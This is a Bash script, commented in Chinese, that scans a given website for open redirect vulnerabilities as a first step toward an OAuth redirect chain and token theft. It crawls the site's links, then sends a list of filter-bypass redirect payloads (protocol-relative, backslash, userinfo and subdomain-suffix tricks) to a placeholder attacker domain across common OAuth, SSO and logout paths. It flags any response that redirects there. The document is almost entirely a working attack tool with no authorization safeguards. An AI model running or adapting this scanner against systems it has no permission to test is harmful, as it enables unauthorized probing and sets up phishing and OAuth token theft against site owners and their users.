#!/usr/bin/env bash
# hunt-open-redirect.sh — Open redirect 探測 + OAuth chain 候選
# 來源：OAuth redirect_uri chain (public pattern) — OAuth CSRF redirect chain → token theft）
#
# 流程：
#   1. Crawl HTML / sitemap / robots.txt 找含 redirect-like params 的 URL
#   2. 對每個候選測常見 bypass pattern
#   3. 回應 30x + Location header 指向 attacker domain 就命中
#
# 常見 redirect param 名稱：
#   url / redirect / next / return / return_url / returnTo / continue /
#   dest / destination / target / goto / forward / link / to / out /
#   returnUrl / back / backurl / callback / redir / r / u
#
# Bypass 變體：
#   https://attacker.com
#   //attacker.com
#   /\/attacker.com (backslash)
#   https:attacker.com (missing //)
#   //attacker.com%2f@target.com
#   https://target.com.attacker.com (suffix)
#   https://attacker.com?c=target.com (fake ownership)
#
# 用法：
#   ./hunt-open-redirect.sh https://target.com
set -uo pipefail

HOST="${1:-}"
[ -z "$HOST" ] && { echo "Usage: $0 <https://host>"; exit 1; }
HOST="${HOST%/}"
DOMAIN=$(echo "$HOST" | sed -E 's|^https?://||' | cut -d/ -f1)
OUT_DIR="${OUT_DIR:-./redirect_out}"
mkdir -p "$OUT_DIR"
SLUG=$(echo "$HOST" | sed 's|https\?://||;s|[/:]|_|g')
OUT="$OUT_DIR/${SLUG}.txt"
: > "$OUT"
log(){ echo "[$(date +%H:%M:%S)] $*" | tee -a "$OUT"; }
hit(){ echo "🔴 $*" | tee -a "$OUT"; }

log "=== open redirect hunt: $HOST ==="

ATTACKER="evil-$(date +%s).example.org"

# ── Step 1: collect candidate URLs from HTML ───────────────────
HTML=$(curl -sk --max-time 10 "$HOST/")
CANDIDATES=""

# Extract URLs with redirect-like params from HTML
if [ -n "$HTML" ]; then
  CANDIDATES=$(echo "$HTML" | \
    grep -oE '(href|src|action)="[^"]+"' | \
    sed -E 's/^(href|src|action)="([^"]+)"$/\2/' | \
    grep -iE '(url|redirect|next|return|continue|dest|target|goto|forward|link|callback|redir|backurl)=' | \
    sort -u | head -20)
fi

# Add common OAuth / SSO / logout paths that often have redirect params
COMMON_PATHS="
/oauth/authorize
/oauth2/authorize
/sso/login
/login
/logout
/account/logout
/signin
/auth/callback
/auth/login
/callback
/redirect
/go
/out
/r
/link
"

# ── Step 2: test each param name on common paths ──────────────
PAYLOADS=(
  "https://${ATTACKER}"
  "//${ATTACKER}"
  "/\\\\${ATTACKER}"
  "https:${ATTACKER}"
  "//${ATTACKER}%2f@${DOMAIN}"
  "https://${DOMAIN}.${ATTACKER}"
  "https://${ATTACKER}/?c=${DOMAIN}"
  "https://${ATTACKER}%23.${DOMAIN}"
  "https://${ATTACKER}@${DOMAIN}"
)

PARAMS=(url redirect next return returnTo continue dest target goto forward link callback redir back backurl to out r u)

CHECKED=0
for PATH_ in $COMMON_PATHS; do
  [ -z "$PATH_" ] && continue
  # Probe path exists first
  local_code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "${HOST}${PATH_}")
  case "$local_code" in
    200|301|302|303|307|308|400|405) ;;
    *) continue;;
  esac

  for P in "${PARAMS[@]}"; do
    for PL in "${PAYLOADS[@]}"; do
      URL="${HOST}${PATH_}?${P}=${PL}"
      # -I would skip body but some servers return 405 for HEAD; use -sI + fallback
      LOC=$(curl -sk --max-time 5 -D - -o /dev/null "$URL" 2>/dev/null | \
        grep -i "^location:" | head -1 | tr -d '\r\n' | awk '{print $2}')
      if [ -n "$LOC" ]; then
        # Check if Location contains attacker domain (not target)
        if echo "$LOC" | grep -qE "(^|/|@)${ATTACKER}(/|$|\\?|#|:)"; then
          hit "open redirect: $URL → Location: $LOC"
        fi
      fi
      CHECKED=$((CHECKED+1))
      [ "$CHECKED" -gt 200 ] && break 3
    done
  done
done

# ── Step 3: test HTML-discovered candidates with their existing param ─
if [ -n "$CANDIDATES" ]; then
  echo "$CANDIDATES" | while read U; do
    [ -z "$U" ] && continue
    # Resolve relative URLs
    [[ "$U" == /* ]] && U="${HOST}${U}"
    [[ "$U" != http* ]] && continue
    # Replace redirect param value with payload
    for PL in "${PAYLOADS[@]}"; do
      MODIFIED=$(echo "$U" | sed -E 's/(url|redirect|next|return|continue|dest|target|goto|forward|link|callback|redir|back|backurl|to|out)=[^&]*/\1='"$PL"'/')
      [ "$MODIFIED" = "$U" ] && continue
      LOC=$(curl -sk --max-time 5 -D - -o /dev/null "$MODIFIED" 2>/dev/null | \
        grep -i "^location:" | head -1 | tr -d '\r\n' | awk '{print $2}')
      if [ -n "$LOC" ] && echo "$LOC" | grep -qE "(^|/|@)${ATTACKER}(/|$|\\?|#|:)"; then
        hit "open redirect: $MODIFIED → Location: $LOC"
      fi
    done
  done
fi

log "=== done → $OUT (probed $CHECKED combos) ==="
